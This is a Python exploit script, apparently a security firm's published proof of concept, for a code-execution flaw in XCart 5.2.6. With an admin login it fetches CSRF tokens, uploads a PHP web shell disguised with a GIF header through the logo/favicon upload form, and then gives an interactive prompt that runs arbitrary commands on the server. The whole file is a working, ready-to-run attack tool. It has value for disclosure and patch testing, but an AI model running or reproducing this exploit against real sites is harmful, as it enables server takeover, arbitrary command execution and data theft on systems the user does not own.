#!/usr/local/bin/python
# Exploit for XCart 5.2.6 Code Execution vulnerability
# An admin account is required to use this exploit
# Curesec GmbH

import sys
import re
import requests # requires requests lib

if len(sys.argv) != 4:
    exit("usage: python " + sys.argv[0] + " http://example.com/xcart/ admin@example.com admin")

url = sys.argv[1]
username = sys.argv[2]
password = sys.argv[3]

loginPath = "/admin.php?target=login"
fileManagerPath = "/admin.php?target=logo_favicon"

shellFileName = "404.php"
shellContent = "GIF89a;<?php passthru($_GET['x']); ?>"

def login(requestSession, url, username, password):
    csrfRequest = requestSession.get(url)
    csrfTokenRegEx = re.search('name="xcart_form_id" type="hidden" value="(.*)" class', csrfRequest.text)
    csrfToken = csrfTokenRegEx.group(1)

    postData = {"target": "login", "action": "login", "xcart_form_id": csrfToken, "login": username, "password": password}
    loginResult = requestSession.post(url, data = postData).text
    return "Invalid login or password" not in loginResult

def upload(requestSession, url, fileName, fileContent):
    csrfRequest = requestSession.get(url)
    csrfTokenRegEx = re.search('SimpleCMS" />\n<input  type="hidden" name="xcart_form_id" value="(.*)" />', csrfRequest.text)
    csrfToken = csrfTokenRegEx.group(1)

    filesData = {"logo": (fileName, fileContent)}
    postData = {"target": "logo_favicon", "action": "update", "page": "CDev\SimpleCMS", "xcart_form_id": csrfToken}
    uploadResult = requestSession.post(url, files = filesData, data = postData)
    return "The data has been saved successfully" in uploadResult.text

def runShell(url):
    print("enter command, or enter exit to quit.")
    command = raw_input("$ ")
    while "exit" not in command:
        print(requests.get(url + command).text.replace("GIF89a;", ""))
        command = raw_input("$ ")


requestSession = requests.session()

if login(requestSession, url + loginPath, username, password):
    print("successful: login")
else:
    exit("ERROR: Incorrect username or password")

if upload(requestSession, url + fileManagerPath, shellFileName, shellContent):
    print("successful: file uploaded")
else:
    exit("ERROR: could not upload file")

runShell(url + shellFileName + "?x=")


Blog Reference:
http://blog.curesec.com/article/blog/XCart-526-Code-Execution-Exploit-87.html
